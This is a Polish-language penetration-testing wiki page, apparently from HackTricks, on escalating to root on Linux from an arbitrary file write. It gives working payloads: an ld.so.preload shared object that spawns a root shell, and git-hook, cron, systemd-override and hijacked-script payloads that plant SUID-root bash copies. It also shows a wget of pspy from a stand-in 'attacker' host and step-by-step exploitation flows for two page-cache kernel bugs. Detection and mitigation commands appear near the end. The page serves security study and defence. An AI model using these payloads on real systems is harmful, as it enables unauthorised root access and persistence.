# Dowolny zapis pliku jako root

### /etc/ld.so.preload

`/etc/ld.so.preload` to systemowa lista shared objects, które dynamic linker ładuje przed innymi shared objects. Tryb secure-execution nakłada dodatkowe ograniczenia na preloading, dlatego ścieżka biblioteki taka jak `/tmp/pe.so` nie jest uniwersalną techniką dla plików binarnych SUID.\
Jeśli możesz utworzyć ten plik lub go zmodyfikować, proces, który go załaduje, załaduje wymienioną bibliotekę przed innymi shared objects, umożliwiając code execution w kontekście tego procesu.<sup>[[12]](#references)</sup>

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** to wykonywalne skrypty uruchamiane podczas zdarzeń w repozytorium, w tym operacji commit i merge. Jeśli **uprzywilejowany skrypt lub użytkownik** wykonuje te działania, a attacker może **zapisywać w folderze `.git`**, hook może zostać użyty do **privilege escalation**.<sup>[[13]](#references)</sup>

Na przykład można **wygenerować skrypt** w repozytorium git w **`.git/hooks`**, aby był zawsze wykonywany po utworzeniu nowego commita:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Pliki Cron i czasu

Jeśli możesz **zapisywać pliki związane z Cronem, które są wykonywane przez root**, zazwyczaj możesz uzyskać wykonanie kodu przy następnym uruchomieniu zadania. Interesujące cele obejmują:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Własny crontab użytkownika root w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- Timery `systemd` oraz usługi, które uruchamiają

Szybkie sprawdzenia:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typowe ścieżki wykorzystania:

- **Dodaj nowy root cron job** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąp skrypt** już wykonywany przez `run-parts`
- **Umieść backdoor w istniejącym celu timera**, modyfikując skrypt lub plik binarny, który uruchamia

Minimalny przykład cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Jeśli możesz zapisywać wyłącznie w katalogu cron używanym przez `run-parts`, umieść tam zamiast tego plik wykonywalny:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Uwagi:

- `run-parts` zwykle ignoruje nazwy plików zawierające kropki, dlatego preferuj nazwy takie jak `backup` zamiast `backup.sh`.<sup>[[15]](#references)</sup>
- Niektóre systemy używają timerów `systemd` zamiast klasycznego crona, ale idea abuse jest taka sama: **zmodyfikuj to, co root wykona później**.<sup>[[20]](#references)</sup>

### Pliki Service i Socket

Jeśli możesz zapisywać **pliki jednostek `systemd`** lub pliki, do których się odwołują, możesz uzyskać code execution jako root poprzez przeładowanie i ponowne uruchomienie jednostki albo oczekiwanie na uruchomienie ścieżki aktywacji service/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interesujące cele obejmują:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Nadpisania drop-in w `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binaria service, do których odwołują się `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisywalne ścieżki `EnvironmentFile=` ładowane przez service uruchamiany jako root

Szybkie sprawdzenia:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Overwrite `ExecStart=`** w należącej do root jednostce service, którą możesz modyfikować
- **Add a drop-in override** z użyciem złośliwego `ExecStart=` i najpierw wyczyść poprzednią wartość
- **Backdoor the script/binary** już wskazany przez jednostkę
- **Hijack a socket-activated service** poprzez modyfikację odpowiadającego pliku `.service`, który uruchamia się, gdy socket otrzyma połączenie

Przykładowy złośliwy override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typowy przebieg aktywacji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Jeśli nie możesz samodzielnie restartować usług, ale możesz edytować jednostkę aktywowaną przez socket, być może wystarczy **poczekać na połączenie klienta**, aby uruchomić backdoored service jako root.<sup>[[17]](#references)</sup>

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowany PHP sandbox

Niektóre niestandardowe daemony weryfikują PHP dostarczony przez użytkownika, uruchamiając `php` z **ograniczonym `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli kod uruchamiany w sandboxie nadal ma **dowolny mechanizm zapisu** (taki jak `file_put_contents`) i możesz uzyskać dostęp do **dokładnej ścieżki `php.ini`** używanej przez daemon, możesz **nadpisać tę konfigurację**, aby znieść ograniczenia, a następnie przesłać drugi payload uruchamiany z podwyższonymi uprawnieniami.<sup>[[2]](#references)</sup>

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację sandboxa.
2. Drugi payload wykonuje kod po ponownym włączeniu niebezpiecznych funkcji.

Minimalny przykład (zastąp ścieżkę używaną przez daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Jeśli daemon działa jako root (lub przeprowadza walidację przy użyciu ścieżek należących do root), drugie wykonanie zapewnia kontekst root. Jest to zasadniczo **escalation uprawnień poprzez nadpisanie konfiguracji**, gdy sandboxed runtime nadal może zapisywać pliki.

### binfmt_misc

`binfmt_misc` udostępnia rejestracje w `/proc/sys/fs/binfmt_misc`; każda rejestracja wiąże wzorzec typu pliku z interpreterem. Wpływ na uprawnienia zależy od tego, kto może zmieniać rejestrację oraz który proces później wykonuje pasujący plik, dlatego przed uznaniem tego za ścieżkę do escalation uprawnień należy zweryfikować te wymagania.<sup>[[21]](#references)</sup>

### Nadpisywanie handlerów schematów (takich jak http: lub https:)

Środowiska desktopowe używają powiązań MIME i desktop entries do wyboru aplikacji dla schematów URI; attacker, który może zapisywać w odpowiednich konfiguracjach per-user oraz katalogach desktop entries, może przekierować te schematy do launchera znajdującego się pod jego kontrolą. Modyfikując plik `$HOME/.config/mimeapps.list` tak, aby wskazywał HTTP i HTTPS URL handlery na złośliwy plik (na przykład `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), kliknięcie użytkownika może uruchomić ten desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root wykonujący skrypty/pliki binarne zapisywalne przez użytkownika

Jeśli uprzywilejowany workflow uruchamia coś takiego jak `/bin/sh /home/username/.../script` (lub dowolny plik binarny znajdujący się w katalogu należącym do nieuprzywilejowanego użytkownika), możesz to przejąć:<sup>[[1]](#references)</sup>

- **Wykrywanie wykonania:** monitoruj procesy za pomocą pspy, aby wykryć uruchamianie przez root ścieżek kontrolowanych przez użytkownika.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potwierdź możliwość zapisu:** upewnij się, że zarówno plik docelowy, jak i jego katalog są własnością Twojego użytkownika lub można w nich zapisywać.
- **Przejmij plik docelowy:** wykonaj kopię zapasową oryginalnego binary/skryptu i umieść payload tworzący powłokę SUID (lub wykonujący dowolną inną akcję root), a następnie przywróć uprawnienia:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Uruchom uprzywilejowaną akcję** (np. naciskając przycisk UI, który uruchamia helpera). Gdy root ponownie wykona przejętą ścieżkę, przejmij eskalowaną powłokę za pomocą `./rootshell -p`.

### Modyfikacja pliku uprzywilejowanych binariów wyłącznie w page cache

Niektóre błędy kernela nie modyfikują pliku **na dysku**. Zamiast tego umożliwiają modyfikację wyłącznie **kopii w page cache** czytelnego pliku. Jeśli można zaatakować plik binarny z bitem **setuid** lub inny plik **wykonywany przez root**, następne wykonanie może uruchomić kontrolowane przez atakującego bajty z pamięci i doprowadzić do eskalacji uprawnień, mimo że hash pliku na dysku pozostaje niezmieniony.<sup>[[3]](#references)[[4]](#references)</sup>

Warto traktować to jako **prymityw zapisu do pliku wyłącznie w czasie działania**:<sup>[[3]](#references)</sup>

- **Dysk pozostaje czysty**: inode i bajty na dysku nie zmieniają się
- **Pamięć jest zmodyfikowana**: procesy odczytujące lub wykonujące zawartość zbuforowanej strony otrzymują treść zmodyfikowaną przez atakującego
- **Efekt jest tymczasowy**: zmiana znika po ponownym uruchomieniu systemu lub eksmisji z cache

Ten prymityw znajduje się pomiędzy klasycznym **arbitrary file write** a starszymi błędami związanymi z nadużyciem page cache, takimi jak Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW opierał się na race condition
- Dirty Pipe miał ograniczenia dotyczące pozycji zapisu
- Prymityw wykorzystujący wyłącznie page cache może być bardziej niezawodny, jeśli podatna ścieżka zapewnia bezpośrednie zapisy do zbuforowanych stron powiązanych z plikiem

#### Ogólny przebieg privesc

1. Uzyskaj prymityw kernela umożliwiający zapis do stron page cache powiązanych z plikiem
2. Użyj go przeciwko **czytelnemu uprzywilejowanemu plikowi binarnemu** lub innemu plikowi wykonywanemu przez root
3. Uruchom wykonanie **zanim** strona zostanie usunięta z cache
4. Uzyskaj wykonanie kodu jako root, podczas gdy plik na dysku nadal wygląda na niezmodyfikowany

Typowe cele o wysokiej wartości:

- Binarne pliki **setuid-root**
- Helpery uruchamiane przez **usługi root**
- Binarne pliki często uruchamiane z **kontenerów współdzielących kernel/page cache hosta**

#### Przykładowa ścieżka AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) jest dobrym przykładem tej klasy. Podatna ścieżka znajdowała się w userspace API kryptografii Linuksa (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` może przenosić referencje do stron page cache z czytelnego pliku do scatterlist TX kryptografii
- ścieżka deszyfrowania `algif_aead` in-place ponownie wykorzystywała bufory źródłowe i docelowe
- `authencesn` następnie zapisywał do regionu tagu docelowego
- gdy ten region nadal wskazywał na strony powiązane z plikiem w page cache, zapis trafiał do **page cache pliku docelowego**

Interesująca technika nie polega więc na samym CVE, lecz na następującym wzorcu:

- **dostarcz strony cache powiązane z plikiem do podsystemu kernela**
- spraw, aby podsystem **traktował je jako zapisywalny output**
- wywołaj niewielkie, kontrolowane nadpisanie w pamięci

Publiczny PoC używał wielokrotnych **zapisów 4-bajtowych** do spatchowania `/usr/bin/su` w pamięci, a następnie go wykonywał.<sup>[[4]](#references)[[7]](#references)</sup>

#### Przykładowa ścieżka ESP / XFRM + klon TEE netfiltera

DirtyClone (CVE-2026-43503) pokazuje inny wariant tego samego wzorca **zapisu do root wyłącznie w page cache**, ale tym razem miejscem docelowym jest **deszyfrowanie IPsec ESP**, a nie `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Najważniejszą techniką jest **krok prania metadanych**:

- `splice()` umieszcza **tylko do odczytu stronę page cache powiązaną z plikiem** w pakiecie ESP-in-UDP
- pierwotna mitigacja DirtyFrag oznaczała ten skb flagą `SKBFL_SHARED_FRAG`, aby `esp_input()` wykonywał **kopiowanie przed deszyfrowaniem**
- netfilter `TEE` duplikuje pakiet przez `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- klon zachowuje **tę samą fizyczną referencję do strony page cache**, ale traci `SKBFL_SHARED_FRAG`
- `esp_input()` uznaje wtedy klon za bezpieczny i wykonuje deszyfrowanie **in-place `cbc(aes)`** na stronie powiązanej z plikiem

Wniosek dla reviewera jest szerszy niż samo CVE: jeśli mitigacja zależy od **metadanych skb/page** przy podejmowaniu decyzji, czy operacja musi najpierw wykonać kopiowanie, każda **ścieżka klonowania/kopiowania, która zachowuje stronę bazową, ale usuwa metadane**, może po cichu ponownie otworzyć prymityw zapisu.

Typowy przebieg wykorzystania:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` w celu uzyskania **`CAP_NET_ADMIN` w prywatnej przestrzeni nazw sieci**
2. włącz loopback i zainstaluj regułę **`TEE` netfiltera** w `mangle/OUTPUT`
3. zainstaluj transportowe SA XFRM ESP za pomocą `NETLINK_XFRM`
4. zakoduj każde docelowe słowo 4-bajtowe w polu `seq_hi` SA (trick wyboru słowa DirtyFrag)
5. wyślij spliced pakiet ESP-in-UDP, aby **klon TEE** dotarł do `esp_input()` i wykonał deszyfrowanie **in-place**
6. powtarzaj operację, aż kopia `/usr/bin/su` w page cache lub innego uprzywilejowanego pliku wykonywalnego będzie zawierała kod kontrolowany przez atakującego

Z punktu widzenia działania wpływ jest taki sam jak w przykładzie `AF_ALG`: plik na dysku pozostaje czysty, ale `execve()` wykorzystuje **zmodyfikowane bajty page cache** i zapewnia root.<sup>[[8]](#references)[[9]](#references)</sup>

Przydatne kontrole ekspozycji dla tego wariantu:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Krótkoterminowa redukcja powierzchni ataku jest tutaj również zależna od ścieżki: aktualizacja do kernela zawierającego `48f6a5356a33` naprawia ścieżkę `clone`, natomiast zablokowanie autoloadingu `xt_TEE` usuwa **krok flag-laundering**, a zablokowanie `esp4` / `esp6` usuwa **sink deszyfrowania**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Wykrywanie ekspozycji i polowanie

Jeśli podejrzewasz tę klasę błędów, nie polegaj wyłącznie na kontrolach integralności dysku. Sprawdź również:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Poniższe wartości konfiguracji odróżniają interfejs ładowalny od interfejsu wbudowanego w kernel; reguły budowania crypto mapują `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` może być ładowany i wyładowywany jako moduł
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs jest wbudowany w kernel
- binaria setuid są dobrymi celami, ponieważ patch obejmujący wyłącznie page cache może wystarczyć, aby przekształcić lokalny foothold w root

#### Redukcja attack surface dla ścieżki `algif_aead`

Jeśli podatny interfejs jest dostarczany przez ładowalny moduł:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Jeśli zostanie skompilowane do jądra, w niektórych ujawnieniach zgłaszano blokowanie ścieżki init za pomocą:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Ten rodzaj mitigacji warto pamiętać także w przypadku innych kernel LPE: jeśli exploitation zależy od konkretnego opcjonalnego interfejsu, wyłączenie tego interfejsu lub dodanie go do blacklisty może przerwać ścieżkę exploita jeszcze przed udostępnieniem pełnej aktualizacji kernela.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – przejęcie skryptu wykonywanego przez root w zapisywalnym przez użytkownika katalogu PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Ujawnienie Openwall oss-security dotyczące CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Poprawka Linux stable: crypto: algif_aead — powrót do działania out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory CVE-2026-31431](https://copy.fail/)
- [7] [Techniczny writeup Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repozytorium / README DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i exploitation wariantu Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Poprawka Linux: net: skb: zachowanie `SKBFL_SHARED_FRAG` w `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Wcześniejsza mitigation Linux: ustawienie `SKBFL_SHARED_FRAG` dla pakietów UDP po splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — strona podręcznika Debiana](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — dokumentacja Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Powiązania aplikacji MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specyfikacja Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specyfikacja Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Język Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: podatność page cache Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
